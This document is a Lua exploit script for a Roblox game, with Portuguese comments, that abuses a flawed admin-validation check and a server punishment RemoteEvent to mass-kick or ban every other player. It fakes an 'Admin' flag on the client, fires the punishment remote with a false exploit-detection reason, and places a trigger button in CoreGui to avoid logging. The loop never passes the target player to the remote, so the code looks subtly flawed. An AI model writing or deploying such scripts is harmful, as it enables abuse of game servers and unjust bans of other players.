--[[ 
    COSMO EXTERMINATOR V9
    Explora a falha de validação de Admin e o Remote de punição.
]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local localPlayer = Players.LocalPlayer

-- 1. CLOAK DE ADMIN (Engana a função Punish do Cosmo)
local adminTag = Instance.new("BoolValue")
adminTag.Name = "Admin"
adminTag.Value = true
adminTag.Parent = localPlayer

-- 2. LOCALIZAR O CANAL DE PUNIÇÃO (Pasta 'ç' detectada no cosmo2.txt)
local replicatedFolder = ReplicatedStorage:WaitForChild("Replicated", 5)
local punishmentRemote = nil

if replicatedFolder then
    local eventsFolder = replicatedFolder:FindFirstChild("ç")
    if eventsFolder then
        punishmentRemote = eventsFolder:FindFirstChildOfClass("RemoteEvent")
    end
end

-- 3. FUNÇÃO DE EXTERMÍNIO
local function kickEveryone()
    if not punishmentRemote then 
        print("Falha: Remote de punição não encontrado.")
        return 
    end

    for _, v in pairs(Players:GetPlayers()) do
        if v ~= localPlayer then
            -- Dispara o remote fingindo que o alvo usou um exploit pesado
            -- Isso ativa o Punish(player, "Ban", reason) do servidor
            punishmentRemote:FireServer("Exploit Detectado: Synapse V3 Injection")
            print("Sinal de banimento enviado para: " .. v.Name)
        end
    end
end

-- Interface Simples e Silenciosa (Evita LogService)
local screenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
local btn = Instance.new("TextButton", screenGui)
btn.Size = UDim2.new(0, 200, 0, 50)
btn.Position = UDim2.new(0.5, -100, 0.1, 0)
btn.Text = "LIMPAR SERVIDOR (MASS KICK)"
btn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
btn.TextColor3 = Color3.fromRGB(255, 255, 255)

btn.MouseButton1Click:Connect(function()
    kickEveryone()
    btn.Text = "COMANDO ENVIADO!"
    wait(2)
    btn.Text = "LIMPAR SERVIDOR (MASS KICK)"
end)
